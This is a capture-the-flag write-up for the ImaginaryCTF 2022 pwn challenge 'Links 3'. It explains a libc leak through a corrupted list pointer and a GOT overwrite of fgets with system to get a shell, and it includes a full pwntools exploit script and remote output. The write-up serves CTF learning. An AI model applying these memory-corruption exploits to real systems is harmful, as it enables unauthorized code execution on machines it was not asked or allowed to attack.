---
name: Links 3 (2022)
event: Imaginary CTF 2022
category: Pwn
description: Writeup for Links 3 (Pwn) - Imaginary CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Links 3

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/GCkHwYBlsN8/0.jpg)](https://www.youtube.com/watch?v=GCkHwYBlsN8 "Links 3")

## Description

> And now you guys are exploiting my View Time feature that I put there solely for your convenience? Fine, then - no more time for you!

**[download challenge binary](https://imaginaryctf.org/r/iYVvf#links3)**

## Solution

I'll keep this short; since `Links 2`, the `view_time` function has been removed. We no longer have `system` in the GOT, but that doesn't matter.

As is common practice with stack-based buffer overflows, we can leak **any** Lib-C function address and then calculate our way back to the base of the binary. From there, we can add any offset we like to get the function of choosing, e.g. `libc.system` or a string, e.g. `libc."/bin/sh"`.

I chose to leak `got.puts`, when run against the server it leaks `0x7fbfd373eed0`. Once we get an address of a known function, we can take it to **[libc.blukat.me](https://libc.blukat.me)** or **[libc.rip](https://libc.rip)** and provide the function name and address.

We'll get a list of possible Lib-C library versions. The more functions we leak, the more we can narrow down the search.

In this case, the correct version was `libc6_2.35-0ubuntu3_amd64`, so we plug in the correct offsets.

{% code overflow="wrap" %}
```py
libc = puts - 0x80ed0
system = libc + 0x50d60
```
{% endcode %}

Running the binary, we get a shell.

{% code overflow="wrap" %}
```py
python exploit.py REMOTE puzzler7.imaginaryctf.org 2998
[+] Opening connection to puzzler7.imaginaryctf.org on port 2998: Done
[*] leaked got_puts: 0x7f470992eed0
[*] got_system: 0x7f47098fed60
[*] Switching to interactive mode
 What data do you want to write to this element?

>>> $ cat flag.txt
ictf{dammit_I'm_never_gonna_mix_up_64_and_0x64_again_it's_cost_me_three_flags_already}
```
{% endcode %}

**note:** If this write-up didn't make much sense, review `Links 1` and `Links 2` write-ups first 🙂

## Solve Script

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break write_data
continue
'''.format(**locals())

# Binary filename
exe = './links3'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# View time (populate system() in GOT)
io.sendlineafter(b'>>>', b'3')

# Add 5 elements to list
for i in range(5):
    io.sendlineafter(b'>>>', b'2')
    io.sendlineafter(b'>>>', str(i).encode())
    io.sendlineafter(b'>>>', b'CHUNK_' + str(i).encode())

# Overflow element pointer with got.system address
# This is because we need libc leak for x64 stack align
io.sendlineafter(b'>>>', b'2')
io.sendlineafter(b'>>>', b'3')
# Overwrite the link to point to GOT entry, 0x51 for next chunk size to keep list intact
io.sendlineafter(b'>>>', (b'\x00' * 64) + flat([elf.got.puts, 0x51]))

# View list (leak libc.puts() address)
io.sendlineafter(b'>>>', b'1')
io.recvuntil(b'3: ')
puts = unpack(io.recv()[4:10].ljust(8, b'\x00'))
info("leaked got_puts: %#x", puts)
# libc6_2.35-0ubuntu3_amd64 - https://libc.rip/
libc = puts - 0x80ed0
system = libc + 0x50d60
info("got_system: %#x", system)

# Modify element in list
io.sendline(b'2')
io.sendlineafter(b'>>>', b'1')
# Overwrite the link to point to GOT entry, 0x51 for next chunk size to keep list intact
io.sendlineafter(b'>>>', b'/bin//sh' + (b'\x00' * 56) + flat([elf.got.fgets, 0x51]))

# Add element to list
io.sendlineafter(b'>>>', b'2')
io.sendlineafter(b'>>>', b'2')
# Overwrite got.fgets with system
io.sendlineafter(b'>>>', flat(system))

# See if we've got a shell
io.sendlineafter(b'>>>', b'2')
io.sendlineafter(b'>>>', b'1')
# Got Shell?
io.interactive()
```
{% endcode %}
